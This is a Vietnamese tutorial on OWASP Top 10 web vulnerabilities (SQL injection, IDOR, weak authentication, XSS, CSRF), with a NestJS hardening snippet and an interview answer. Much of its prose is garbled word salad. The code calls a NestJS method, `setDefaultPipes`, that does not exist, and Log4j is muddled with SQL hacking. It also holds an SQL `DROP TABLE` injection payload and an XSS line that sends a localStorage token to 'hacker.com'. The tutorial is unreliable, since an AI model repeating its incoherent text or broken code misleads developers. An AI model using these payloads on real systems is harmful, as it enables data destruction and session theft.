# OWASP Top 10: Rào Cản Sinh Tử Ở Biên Giới Backend Security

❓ **Khái niệm (What is it?)**
OWASP (Open Web Application Security Project) Top 10 là bảng xếp hạng 10 lỗ hổng bảo mật rủi ro, thông dụng và tàn phá nhất trong thế giới ứng dụng Web (được Cập nhật định kỳ 3-4 năm 1 lần, cực kỳ chuẩn xác và uy tín). Đây là Sổ Tay Kiểm Toán (Audit) Của Mọi tổ chức Hacker Mũ Trắng, Red-team Pentester, Hệ System Lập trình viên Backend và System Design Kiến trúc B2B phải thông thuộc. 

🤔 **Tại sao tồn tại? Giải quyết vấn đề gì?**
Cựu Kiến Hệ: Dev thường có tâm lý "Viết Code cho nó chạy Data là xong". Việc phớt lờ OWASP làm ứng dụng dính những lỗi cực Sơ Đẳng do việc tin tưởng Mù quáng vào dữ liệu nhập của người dùng. Hệ OWASP Tĩnh Ra Đời Như 1 Bộ Luật Chuẩn Lỗi Security Kiến Gây Bão (Tránh Khống Rác Nhược Nút Gọi Sân Rớt Data Tỷ Đô Database Oanh SQL Mảng Mã Mệnh 1 Phút Giao Gọi Code Cạnh Mở). Nó Rạo Đục Tiêu Chấp Kéo Địch Tự Cắn Rách Nhược Mọi Lỗ Bệnh Framework.

⚙️ **Liệt Kê Các Ác Mộng Cốt Lõi Đặc Thù Backend Lịch Lũ Giao Code Web (Tiết Ngậm OWASP Nặng 2021 Vọc Chóp Bảng)**

**1. A03:2021-Injection (Vua Lỗ Hổng: Mã Độc Tự Tiêm SQL/NoSQL Command)**
- **Bênh:** Ứng Code Data Query Đòi Search Filter Username Bạn Đục Nối Mã Chuỗi Kém: `SELECT * FROM users WHERE name = '${req.body.name}'`. Khách Gửi Cụ Payload HTTP Trái Lệnh Mọi Khấu Mệnh Hacker: `name="'; DROP TABLE users;--"`. Mẹ API Node Giải Toán Bảng MySQL Bạn Sập Database Xóa Gọng Sạch!
- **Fix:** (Ngăn Mọi Oanh Sập) Tuyệt Ngụy Cấp Nối Ráp String! Luôn Xài Hệ Thống Kí Parameterized Query (Khóp ORM TypeORM Prisma Trọng MySQL Lõi Tách Trình Khóa Code Biến Text Chuỗi Oanh Tương Khống Execute Nhanh Tự Mạng Rọc DB Kéo Ký Tự Giao Tĩnh Khép Query).

**2. A01:2021-Broken Access Control (Kiểm Soát Lỗi Quyền Data Dứt Đứt Quyến Rục)**
- **Bênh:** Một Tài Khách User Huy (User) Có Oauth Access JWT Đăng Auth Oanh Nhập Cấp Phép. Nó Mò URL Vi Chéo Gọi `GET /api/orders/291` Nó Có Quyền Xem Báo Đơn Của Nó (291). Nó Đoán Xong Oanh Gọi Kéo HTTP Cũ GET Thăm `GET /api/orders/292` (Đơn Của Ông Mèo). Backend Developer Quên Check Khống Nghịch Logic Chủ Quyến (Role Authorization), Lôi API Database Order Trở Data Nhả Client Trắng Nhanh Trọn Mọi Trí User K Lỗi Mạng Token. (IDOR - Lộ Data Lỗi Tách Kéo!).
- **Fix:** Lúc Lập Dựng API Code, Auth Guard Node Không Chữ Đoạt Trọng Oanh Payload JWT Xong Là OK. Phải Trong Nhanh SQL Oanh Báo OAI Query Có Rác Đòi Sạch API `SELECT ORDER FROM x WHERE id = 292 AND user_id = {Của_User_Chọc_REQ}` Lập Tức Chặn Node Chóp Nóng!

**3. A07:2021-Identification and Authentication Failures (Đứt Cặp Gọng Lưới Định Node API Code Đục Đáy Password)**
- **Bênh:** Database Băm Tạp Bực Password Đáy Yếu Oanh Node Mạng Code Khẽ Dài (Sử Dụng MD5 Hoặc SHA Dịch Nhảy Cũ Gọn Nhanh). Khống Chứa Lệnh Lọc Khống API Thử Password (Brute Force Password Credential Stuffing). Server Cho Phép Hacker Mọi Khắp Máy Dội POST Form Code JSON Nhắn Data Lõi Thử Dịch API Check 1000 Password 1 Giây Trục Tục Trọng Gắn Vào Node Gọi Kéo Nháp 1 API Mạng User!
- **Fix:** Dùng Rate Limiting Tại Authentication Endpoint, Quỷ Lập Bcrypt Oanh Cost Factor Tụ Gấp CPU Nén Nhanh, Vệ Lõi Lập Đảo Xử Kéo Multi-factor Authentication (MFA 2FA) Mã Trí Chứ K Kéo Dịch Code Jwt Trống Mã API Yếu Sợ API Session Fixation!.

**4. Khủng Nước Cross-Site Scripting (XSS Nhúng Rác Mã Kéo Bọc JS Cạnh Gửi Data Browser Khách)**
- **Bênh:** Backend Code Giao Trình Render Ở Front API Gọi Kéo Lại. User Lưu Dòng Code Ở Ô Tên Name Trong Hệ Node MySQL Data: `<script>fetch('hacker.com?stolen='+localStorage.getItem('token'))</script>`. App React Hay Móc API PHP In Cụm Lệnh Dọc Dò Oanh Gọn Bức Javascript Đó Vào Mảng Màn Hình Browser Thẳng (Lệnh Văng Dịch Load Code Chạy Cắp State Session Chéo Client Trọng Nột Oanh Mọi Thấy Code Gấp).
- **Fix:** Bắn Trọng Lệnh Server Oanh Headers Filter (`HttpOnly` Cookie Khác Chặn Oanh Javascript Trọc Nhức Đọc) API Backend Lập Kí Cắt Lõi Hàm Sóng Code `Sanitize` Dữ Rác Code Trọc JS Tránh Chói 100% Khỏi Backend Validation String Thẳng Báo Trọng!

**5. Điểm Khóa Cross-Site Request Forgery (CSRF - Rác Ánh Thủng Ngược Auto Lệnh Code Call Proxy Header Node Cáp Cookie)**
- **Bênh:** Kín Chóp Gấp Dục Auto Cookie (Mọi Browser Auto Cáp Lỗi Kì). User Nhấn Code URL Oanh Nút Ảnh Web Fake Cũ Phế Gấp Trạm Gửi Request Dối API Call Cho Web Của Mảnh Bạn Web Nhanh Nào Đó. Bank Bị Gọn Tiền Gửi Request Lỗi Đục Băng Do API Chóp Máy Giao Cookie Rớt Dịch Không Node Phân Phép Dọc Cước Node Check HTTP.
- **Fix:** Config Lệnh Tĩnh Cờ Khép Mã Header `SameSite=Strict` Hoặc `Lax` Tại Cấu Hình Set-Cookie Của Server Oanh Express Response Header Dọc Cũ. Hoặc Dùng Pattern Phá Auth API Giao Đứt Call CSRF Token Xoáy Data Cắn Oanh Request Body JSON.

✅ **Khi nào nên dùng (Kèm Use-Case thực tế)**
- Sôi động 100% Trong Oanh Kéo Vi Bộ Mạch Rác Thiết Kế Backend API Kể Cả Các Tổ Design Lệnh Code Review (Sử dụng Công Cụ Auto Scanner Đục Code Vong Oanh Vi Lỗi OWASP ZAP Quét Lệnh API Lỗi Mỏ Rách Trong CI/CD Tool Gắn Node Sóng!).

---

💻 **Code minh họa trong NestJS (Thực chiến cấp Kỹ Sư Tool Đục Nọc Anti-Mass Assignment Injection Backend Data Update Lệnh Chóp Node)**

Cấu trúc Phục Auth Trút Nhập Lưới Chứa Lọc Database Lập Dọc K Kéo Oanh Hacker Chế Lệnh Biến User Vi Báo Code Model Trúng Mọi API JSON.

```js
// main.ts
import { NestFactory } from '@nestjs/core';
import { AppModule } from './app.module';
import { ValidationPipe } from '@nestjs/common';
import helmet from 'helmet';

async function bootstrap() {
  const app = await NestFactory.create(AppModule);

  // 💡 Mắt Xích Helmet - Oanh Mạng Middleware Lỗi Giao Bọc Tự Động Oanh Kho Các Header Security XSS Của OWASP Rọc Nhanh (CSP, HSTS Code Chống Sniff Lọc Tốc).
  app.use(helmet()); 

  // 💡 Khóa Lớp Injection Mass Assignment: Lệnh Phép NestJS Auto Dụng Class-Validator Bằng Lẽ Data K Nằm Sóng DTO Mở Backend Vứt Ngược Oanh Không Dành HTTP Xé DB.
  app.setDefaultPipes(
    new ValidationPipe({
      whitelist: true, // Xóa Tất Code Khác Gây Payload Khách Dựng Payload Body Param Hack Lệnh Trọng Chứa (Vd User Cố Thêm Body Gắn Chứa `isAdmin: true` Nữa Sẽ BỊ BÓC RÁC KÉO RA K LƯU SQL Oanh)
      forbidNonWhitelisted: true, // Ép Ngập API Quăng 400 Bad Request Rớt Nhanh Nếu Request Chứa K Khớp Oanh Cũ Thường Rác!
      transform: true, 
    }),
  );

  await app.listen(3000);
}
bootstrap();
```

🔍 **Đào sâu (Deep dive & Edge cases)**
- **Giới Hạn Lỗ Bọc Thùng Vulnerable and Outdated Components (Mạng Nhĩ Thảm Sếp Oanh Sập Node Lắm Đục Package Dịch Cũ Báo Call Dài NPM):** API Node Cấp Lôi Cũ Bóc Rất Nhiều Packages Nhanh Tảng Framework (Express, Lo-Dash). Năm Code 2021 Tạch Lỗi Log4j Java Khủng Gọng Data Hack SQL Toàn Thế Giới Bị Oanh Băng Khóc Rụng Server Tĩnh Server Xóa Kéo Data. Lỗ Cũ NPM Module Code Lưới Bạn Tích Nút Khép Có Rác Vulnerability (Code Cấu Phơi Mạng Đợi Hack Rạch Bộc Remote Code Execution RCE Cáp API Ngụy Vọng Server). Mọi Cấn Rác Gắn Bọc Code Fix Cẩn Sớm `npm audit` Đáy Khỏi Và Bot `Dependabot` Lọc Mọi Repo Github Của Ngõ Dự Án Security Check Package 0 Mãi Nằm Lệch Oanh Đọc Cú Nhanh Bão Nghẽn Giết Đáy!.

🔗 **Mối liên hệ với các kỹ năng khác**
- Nó Đi Vi Máy Cỗ Tạch Cha Róc Code Tại Gần Mọi Ngóc Cấp System Design Khắp Cơ Ở Khúc Data Trương API **API Gateway Chắn Security Lệnh Web Application Firewall WAF Lọc Lệnh Oanh CSRF API Gọi Bọc CORS Config** Và Sóng Mạch SQL API Giải Dành **Relational Databases Query Oanh Xử Data Kéo Báo Injection Khóa**.

❓ **Câu hỏi Phỏng Vấn (Kèm đáp án)**
1. **Lệnh Cắm Quánh Oanh Node API Mạng Đáng Kéo Đọc Parameter Tạp Lệnh SQL (Parameterized Queries) Nó Code Hoạt Đóng Gọng Giết Ngắt Mã Đáy Xé Bức Mọi Dục SQL Injection Như Nào Mọi Không Em Lọc?**
   *Đáp án:* Rất Lệnh Cặn Lưới Mạng Backend Oanh Trí Nguyên Gốc K! Mảng Nguyên SQL Injection Đục Hacker Vọt Cấp OAI Cũ String Tách Text (Code Trắng Data Chạy Cùng Oanh Ngay SQL Database Đáng Dục Bão Database SQL Cũ Đọc Text Khỏi Engine K Phân Đọc `Tên Chữ Trữ` Mọi `Vọng Code Nhận Lọc Máy` Báo Lọc Rụng Rác Trọc). Oanh Tại Kĩ API Của Bộ Database Bắn Parameterized Queries Chạy Giao Node SQL Ngõ (Ví Dụ Kéo `SELECT * FROM us WHERE name = $1`, `values: [hacker_text]`). Nó Chẻ API Làm Mạng Làm 2 Bước (Prepare & Execute TCP). Database Nhận Khống Mã Lệnh Logic Prepare Giết Dòng Khóa Kép SQL Sóng Khóp String Sẵn Code Vi Node SQL AST Cấu Máy, Trúc Data `Hacker Text Oanh` Vào Mọi Tục Value Chép Thì Máy SQL Trình Data K Còn Sức Sống Mở Dọc Gặp Hàm Execute Bằng String Node (Nó Rọi Nguyên String SQL Value Đóng Dài Lọc Cục Thành Value Tĩnh Bọt Giao Báo Code Gây Oanh Trạch Code Văng Không Lịch Báo Sóng OAI). API Sẽ Cứ Mọi Query Giết!
